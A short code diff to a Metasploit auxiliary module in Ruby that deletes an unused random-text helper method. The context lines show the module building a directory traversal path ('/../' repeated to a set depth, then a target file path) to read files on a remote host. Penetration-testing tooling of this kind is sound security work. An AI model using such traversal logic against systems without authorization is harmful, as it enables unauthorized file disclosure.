@@ -39,10 +39,6 @@ class MetasploitModule < Msf::Auxiliary
       ])
   end
 
-  def data
-    Rex::Text.rand_text_alpha(3..8)
-  end
-
   def run_host(ip)
     filename = datastore['FILEPATH']
     traversal = '/../' * datastore['DEPTH'] + filename
